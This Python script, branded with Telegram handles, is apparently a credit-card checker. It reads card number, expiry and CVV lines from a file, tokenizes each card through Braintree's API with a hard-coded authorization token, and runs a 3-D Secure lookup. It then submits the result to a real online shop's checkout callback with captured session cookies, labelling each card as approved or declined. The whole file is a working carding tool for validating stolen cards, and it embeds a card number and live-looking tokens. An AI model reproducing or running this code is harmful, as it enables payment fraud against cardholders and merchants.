import requests
import pyfiglet
file=open('m.txt',"+r")
Z =  '\033[1;31m' 
F = '\033[2;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m'
logo = pyfiglet.figlet_format('            MO3GZA ')
print(Z+logo)
k=("----+----+-----+------+-----+") 
print(X+k)
lo=("Tele:@MO3GZA_404\nCh Tele:@THE_S9")
print(C+lo)
i=("----+----+-----+------+-----+")
print(B+i)
o=("#====================================##============================")
print(F+o)
start_num = 0
for P in file.readlines():
	start_num += 1
	n = P.split('|')[0]
	mm=P.split('|')[1]
	yy=P.split('|')[2][-2:]
	cvc=P.split('|')[3].replace('\n', '')
	P=P.replace('\n', '')
	
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2OTMzNTQ2NjAsImp0aSI6ImUxOWU3OWE3LTNjNjgtNGJhNi1hYWYzLTljNmM2MTE2ZDgyMSIsInN1YiI6ImtoanRueHFzZndweXlwcHgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImtoanRueHFzZndweXlwcHgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.VbE6f1zLBI7GoHgNJEzX2-udEkklthKQTb30XioAlLhNK5XAAWcID9q7fkj1zKXpJIMZgfY4kjzE6x3BjXZPAw',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'dropin2',
	        'sessionId': '0d4afc04-5f74-488b-bd35-1036dbab9422',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	                'cardholderName': 'hshsjsj',
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok=(response.json()['data']['tokenizeCreditCard']['token'])
	# Note: json_data will not be serialized by requests
	# exactly as it was in the original request.
	#data = '{"clientSdkMetadata":{"source":"client","integration":"dropin2","sessionId":"0d4afc04-5f74-488b-bd35-1036dbab9422"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4033060022595737","expirationMonth":"11","expirationYear":"2027","cvv":"439","cardholderName":"hshsjsj"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
	#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
	import requests
	
	headers = {
	    'authority': 'api.braintreegateway.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'content-type': 'application/json',
	    'origin': 'https://www.devonhampers.com',
	    'referer': 'https://www.devonhampers.com/',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'amount': '267.05',
	    'additionalInfo': {
	        'shippingGivenName': 'cbxhs',
	        'shippingSurname': 'bjdj',
	        'acsWindowSize': '03',
	        'billingLine1': '1 Florence Court',
	        'billingLine2': '402 North Deeside Road',
	        'billingCity': 'Aberdeen',
	        'billingState': '',
	        'billingPostalCode': 'AB15 9TD',
	        'billingCountryCode': 'GB',
	        'billingGivenName': 'cbxhs',
	        'billingSurname': 'bjdj',
	        'shippingLine1': '1 Florence Court',
	        'shippingLine2': '402 North Deeside Road',
	        'shippingCity': 'Aberdeen',
	        'shippingState': '',
	        'shippingPostalCode': 'AB15 9TD',
	        'shippingCountryCode': 'GB',
	        'email': 'ggdty@gmail.com',
	    },
	    'bin': '403306',
	    'dfReferenceId': '0_71fce01a-5ce0-4c38-8391-9fa0f9839770',
	    'clientMetadata': {
	        'requestedThreeDSecureVersion': '2',
	        'sdkVersion': 'web/3.85.2',
	        'cardinalDeviceDataCollectionTimeElapsed': 974,
	        'issuerDeviceDataCollectionTimeElapsed': 254,
	        'issuerDeviceDataCollectionResult': True,
	    },
	    'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2OTMzNTQ2NjAsImp0aSI6ImUxOWU3OWE3LTNjNjgtNGJhNi1hYWYzLTljNmM2MTE2ZDgyMSIsInN1YiI6ImtoanRueHFzZndweXlwcHgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImtoanRueHFzZndweXlwcHgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.VbE6f1zLBI7GoHgNJEzX2-udEkklthKQTb30XioAlLhNK5XAAWcID9q7fkj1zKXpJIMZgfY4kjzE6x3BjXZPAw',
	    'braintreeLibraryVersion': 'braintree/web/3.85.2',
	    '_meta': {
	        'merchantAppId': 'www.devonhampers.com',
	        'platform': 'web',
	        'sdkVersion': '3.85.2',
	        'source': 'client',
	        'integration': 'custom',
	        'integrationType': 'custom',
	        'sessionId': '0d4afc04-5f74-488b-bd35-1036dbab9422',
	    },
	}
	
	response = requests.post(
	    f'https://api.braintreegateway.com/merchants/khjtnxqsfwpyyppx/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
	    headers=headers,
	    json=json_data,
	)
	nonce=(response.json()['paymentMethod']['nonce'])
	import requests
	
	cookies = {
	    'sib_cuid': '6659c05d-e074-4377-be37-81cec84118d8',
	    '_gid': 'GA1.2.1427957153.1693090606',
	    '_fbp': 'fb.1.1693090606935.1293115582',
	    'cookie-preferences': '%7B%22analytics%22%3Atrue%2C%22marketing%22%3Atrue%2C%22social%22%3Atrue%7D',
	    'shopping_cart': '186fcdc4cb1fd578db09b154b391f99f3c5dad85',
	    'PHPSESSID': '6fkpktrdd703acp4vioarp4ldu',
	    'VPKSignature': 'efd62278dd1bff7877a703809420cd34c87ea2514b30d45c424e381810edadd0',
	    '_ga_MSRHC1JGEM': 'GS1.1.1693093359.2.1.1693093805.0.0.0',
	    '_ga': 'GA1.2.1395596740.1693090606',
	    '_uetsid': 'd501ddf0446311ee998da1431e393673',
	    '_uetvid': '173ac8602c6111eea4f9addda8aff1bd',
	    '_ga_403CTY0H61': 'GS1.2.1693093363.2.1.1693093808.0.0.0',
	}
	
	headers = {
	    'authority': 'www.devonhampers.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://www.devonhampers.com',
	    'referer': 'https://www.devonhampers.com/checkout/pay/?error=Insufficient+Funds&method=braintree',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    'method': 'braintree',
	    'oid': '132868',
	}
	
	data = {
	    'nonce': nonce,
	    'details[cardholderName]': 'hshsjsj',
	    'details[expirationMonth]': '11',
	    'details[expirationYear]': '2027',
	    'details[bin]': '403306',
	    'details[cardType]': 'Visa',
	    'details[lastFour]': '5737',
	    'details[lastTwo]': '37',
	    'type': 'CreditCard',
	    'description': 'ending in 37',
	    'liabilityShifted': 'true',
	    'liabilityShiftPossible': 'true',
	    'threeDSecureInfo[liabilityShifted]': 'true',
	    'threeDSecureInfo[liabilityShiftPossible]': 'true',
	    'threeDSecureInfo[status]': 'authenticate_attempt_successful',
	    'threeDSecureInfo[enrolled]': 'Y',
	    'threeDSecureInfo[cavv]': 'B5gQAHWDhAAAAGhRgmI4dQAAAAA=',
	    'threeDSecureInfo[xid]': '',
	    'threeDSecureInfo[acsTransactionId]': '24f0e426-dbc7-4547-a3ea-55b5279259b5',
	    'threeDSecureInfo[dsTransactionId]': '9dd543bd-ae18-49b3-a5e7-dae1660833fd',
	    'threeDSecureInfo[eciFlag]': '06',
	    'threeDSecureInfo[acsUrl]': '',
	    'threeDSecureInfo[paresStatus]': 'A',
	    'threeDSecureInfo[threeDSecureAuthenticationId]': 'v6k6yfht4pqq88yjnc',
	    'threeDSecureInfo[threeDSecureServerTransactionId]': '9251cfd7-b6f4-4259-a2ca-dc6c5da0f7ab',
	    'threeDSecureInfo[threeDSecureVersion]': '2.2.0',
	    'threeDSecureInfo[lookup][transStatus]': 'A',
	    'threeDSecureInfo[lookup][transStatusReason]': '',
	    'threeDSecureInfo[authentication][transStatus]': '',
	    'threeDSecureInfo[authentication][transStatusReason]': '',
	    'binData[prepaid]': 'No',
	    'binData[healthcare]': 'No',
	    'binData[debit]': 'Yes',
	    'binData[durbinRegulated]': 'No',
	    'binData[commercial]': 'Unknown',
	    'binData[payroll]': 'No',
	    'binData[issuingBank]': 'Axiom Bank',
	    'binData[countryOfIssuance]': 'USA',
	    'binData[productId]': 'F',
	}
	
	response = requests.post(
	    'https://www.devonhampers.com/checkout/callback/',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	ii=response.json()['url']
	if 'Funds' in ii or 'three_d_secure' in ii:
		print(F+f'[ {start_num} ]',P,' ➜ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅')
	elif '+risk_threshold' in ii:
		print(X+f'[ {start_num} ]',P,' ➜ RISK: Retry this BIN later.')
	else:
		print(Z+f'[ {start_num} ]',P,' ➜ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌')
